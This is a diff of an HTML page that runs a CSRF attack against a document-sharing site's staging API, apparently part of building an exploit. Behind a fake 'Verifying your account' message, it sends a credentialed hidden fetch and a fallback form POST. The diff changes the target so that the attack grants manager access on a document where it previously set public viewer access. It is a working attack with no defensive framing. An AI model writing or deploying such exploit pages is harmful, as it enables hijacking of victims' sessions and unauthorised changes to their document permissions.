@@ -31,7 +31,7 @@
         document.getElementById('status').innerHTML = "Verifying your account...";
         
         // Perform stealth CSRF to make document public
-        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer', {
+        fetch('https://staging.textjam.com/api/doc/U5B1D57H/access/private/manager', {
             method: 'POST',
             credentials: 'include',  // Send cookies
             mode: 'no-cors',         // Avoid CORS issues
@@ -45,7 +45,7 @@
             
             // Redirect to document after making it public
             setTimeout(() => {
-                window.location.href = "https://staging.textjam.com/doc/U5B1D57H?message=Document+now+public";
+                window.location.href = "https://staging.textjam.com/doc/U5B1D57H?message=Document+now+manager";
             }, 1500);
         })
         .catch(error => {
@@ -58,7 +58,7 @@
         // Alternative: Form submission method
         var form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/public/viewer';
+        form.action = 'https://staging.textjam.com/api/doc/U5B1D57H/access/private/manager';
         form.style.display = 'none';
         
         // No inputs needed for this endpoint
@@ -72,5 +72,6 @@
     </script>
 </body>
 </html>
+
 
 
